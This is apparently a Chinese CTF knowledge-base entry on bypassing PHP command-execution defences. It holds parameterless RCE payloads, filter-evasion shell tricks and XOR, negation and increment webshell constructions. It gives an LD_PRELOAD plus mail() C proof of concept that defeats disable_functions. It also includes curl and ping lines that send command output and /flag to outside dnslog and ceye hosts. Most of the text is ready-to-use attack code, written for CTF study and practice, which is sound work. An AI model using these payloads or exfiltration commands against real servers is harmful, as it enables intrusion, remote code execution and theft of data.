---
title: 命令执行绕过体系 — 无参数 RCE / 无字母数字 / disable_functions
tags: [rce, command-injection, bypass, 无参数rce, 无字母数字, disable_functions, ld_preload, 命令执行]
category: web
triggers: [rce, 命令执行, command injection, 无参数rce, getallheaders, get_defined_vars, session_id, scandir, 无字母数字, 异或webshell, 取反webshell, 自增webshell, disable_functions, LD_PRELOAD, mail 命令执行, pcntl, 时间盲注, dnslog 外带, ceye 外带, 长度限制绕过]
created: 2026-11-01
updated: 2026-11-01
sources: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/命令执行.md, https://xz.aliyun.com/]
---

# 命令执行绕过体系 — 无参数 RCE / 无字母数字 / disable_functions

## Summary

CTF 的命令执行题本质是**「取参 → 过滤 → 执行 → 回显」四段链路上任一段被掐死**。对应四类绕过：取参被掐（无参数 RCE）、字符被掐（无字母数字/关键字）、函数被掐（disable_functions）、回显被掐（盲外带/时间盲注）。

## Key Points

- 先判断「哪个参数可控 + 哪个函数被禁 + 有没有回显」，再选打法，不要一上来堆 payload
- 无参数 RCE 的通用套路：**从全局变量里捞出可控数据**（HTTP 头、GET/POST 全量变量、session、环境变量、目录列表）
- 无字母数字优先用**异或**（不用取反，避免不可打印字符在传输中损坏）；`~` 取反适合本地生成的 payload
- `disable_functions` 能杀函数但杀不掉「PHP 内部启动子进程」的路径：`mail()`/`error_log()` + `LD_PRELOAD`
- 无回显就别硬刚回显，直接 DNS/HTTP 外带

## Details

### 一、取参被掐：无参数命令执行

题面形如 `if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) eval($_GET['code']);` —— 只允许无参函数嵌套。

| 载体 | Payload | 说明 |
|------|---------|------|
| HTTP 头 | `?code=print_r(pos(getallheaders()));` | 配 `Apache` 环境；`pos()`=`current()` |
| 全量变量 | `?code=var_dump(get_defined_vars());` | 再配合 POST 传 `a=system('ls');` |
| session | `?code=session_id(session_start());` | session 值可控，再 `hex2bin` 解码 |
| 环境变量 | `?code=print_r(getenv());` | 依赖可写环境变量 |
| 目录遍历 | `?code=print_r(scandir(current(localeconv())));` | `localeconv()` 返回数组，`current` 取 `.` 当目录 |
| 读文件链 | `?code=show_source(array_rand(array_flip(scandir(pos(localeconv())))));` | 随机读当前目录文件 |

真实题里的写法（PHP 代码被塞进数组键）：

```
username[<?php eval(end(getallheaders()));?>][]=1&password=5555
```

即「登录框的参数名」被当成 PHP 代码执行，取参靠 `end(getallheaders())` 拿最后一个 HTTP 头。

### 二、字符被掐：空格 / 关键字 / 长度

**空格绕过**

```bash
cat${IFS}/flag
cat$IFS$9/flag
cat</flag
cat<>/flag
cat%09/flag
```

**关键字（如 `cat`、`flag`）绕过**

```bash
ca\t /flag          # 反斜杠
c'a't /flag         # 单引号拼接
$a;cat $a$b         # 变量拼接：a='fl';b='ag'
/???/??/????        # 通配符
tac /flag ; rev /flag ; nl /flag ; od -c /flag ; strings /flag ; xxd /flag
base64 /flag | base64 -d
```

**长度限制（7 字符短命令）**

```bash
>a                  # 创建空文件
ls>a                # 输出重定向进文件
*                    # 通配符把碎片拼成命令
echo${IFS}xxx>>a
```

### 三、字符被掐：无字母数字构造 webshell

**异或**（推荐，全可打印字符）

原理：两个可打印字符异或得到任意目标字符，全 payload 保持可打印、可传输。原文摘录的一行（异或构造 `assert`/函数名后直接调用）：

```
?cmd=$_="+(+).&/"^"[@[@@@@";$_();
```

实战用脚本批量生成：把目标字符串与固定字符串逐字符异或，输出可打印 payload，并按题目正则调整。

**取反**（`~` + URL 编码不可打印字符）

```php
<?php $__=('>'>'<')+('>'>'<');$_=$__/$__;$____='';  // 自增基础
echo (~%8F%97%8F%96%91%99%90)();  // 等价 phpinfo()
```

**自增**（`$_++` 逐字符爬升 ASCII）

```php
$_=[];$_=@"$_";       // $_ 变 Array
$___=++$_;            // 'Array' 变 'Brray' ...
```

要点：异或/或运算脚本要按题目正则改 `$preg`，再生成 payload；取反 payload 传输时必须完整 URL 编码，否则不可打印字符会被截断。

### 四、函数被掐：`disable_functions` 绕过

| 手法 | 条件 | 说明 |
|------|------|------|
| `LD_PRELOAD` + `mail()` | 能传 `.so` + `putenv` 未禁 + `mail()`/`error_log()` 可用 | 启动 sendmail 子进程时加载恶意 so |
| `LD_PRELOAD` + `error_log()` | 同上 | 不依赖 mail 扩展 |
| 蚁剑 + `pcntl_exec` | `pcntl` 扩展存在 | 插件一键拉起 |
| `FFI` | PHP ≥ 7.4 且 `ffi.enable=true` | 直接调 libc |
| GC UAF / `imap_open` | 特定版本 | 老版本利用链，新环境基本失效 |

`LD_PRELOAD` 最小 PoC：

```c
#include <stdlib.h>
#include <stdio.h>
void payload(){ system("id"); }
int geteuid(){ unsetenv("LD_PRELOAD"); payload(); }
```

```bash
gcc -shared -fPIC demo.o -o demo.so
```

```php
<?php putenv("LD_PRELOAD=./demo.so"); mail(",",","); ?>
```

进阶版从环境变量读命令，避免重编译：

```c
int geteuid(){ const char* cmd = getenv("EVIL_CMDLINE"); unsetenv("LD_PRELOAD"); system(cmd); }
```

四个必要条件：**能上传/落地 `.so`、`putenv` 可用、`mail()` 或 `error_log()` 可用、目标可执行外部程序**。

### 五、回显被掐：盲打与数据外带

**DNS/HTTP 外带**

```bash
curl http://xxxx.ceye.io/`whoami`
curl http://xxxx.ceye.io/`ls / | base64`
curl -T /flag http://xxxx.ceye.io/
ping -c1 `whoami`.xxxx.dnslog.cn
```

**时间盲注**

```bash
if [ $(cat /flag | cut -c1) == 'f' ]; then sleep 3; fi
```

逐位猜解，脚本化跑即可。

**Swoole / 框架场景**：`system()` 在协程里无回显时，用 `throw new Exception(执行结果)` 让框架把结果渲染到异常页（2022 春秋杯春季赛就是这么做的）。

## 来源标注

| 技术 | 原始出处 | 比赛实例（已核验） |
|------|----------|-------------------|
| `getallheaders()` 无参数 RCE | 先知社区《命令执行》总结 / XRay 漏洞（X-Forwarded-For 注入） | **2023 NKCTF** Webpagetest（`getallheaders()` 注入）；**2023 第八届上海市大学生网络安全大赛** easy_log（`username[<?php eval(end(getallheaders()));?>][]=1`） |
| `get_defined_vars()` / `session_id()` / `scandir()` 无参数链 | 先知社区《命令执行》 | — |
| 异或/取反/自增 webshell | 先知社区《命令执行》 | — |
| `LD_PRELOAD` + `mail()` | 先知社区《命令执行》 | **2022 USTC Hackergame**（`unsetenv("LD_PRELOAD")` + setuid 提权写法） |
| 框架无回显 → 抛异常回显 | 春秋杯 WP | **2022 春秋杯春季赛** easy-swoole（Swoole `system()` 无回显，用异常带回） |
| 时间盲注 / DNS 外带 | 先知社区《命令执行》 | 通用 |

## Connections

- Related: [[web/php-lfi-getshell-advanced]]、[[web/prototype-pollution-command-injection]]、[[web/just-proto]]、[[web/ssrf-protocol-weaponization]]
- 语料索引：[[ctf/source-corpus--des-ctf-knowledge]]
- Source: [Des-CTF-Knowledge 命令执行.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/命令执行.md)

## Open Questions

- PHP 8.x 下 GC UAF / `imap_open` 链是否完全失效？
- `disable_functions` 绕过在新版利用中是否稳定可用（需要容器内可执行 `gcc`）？
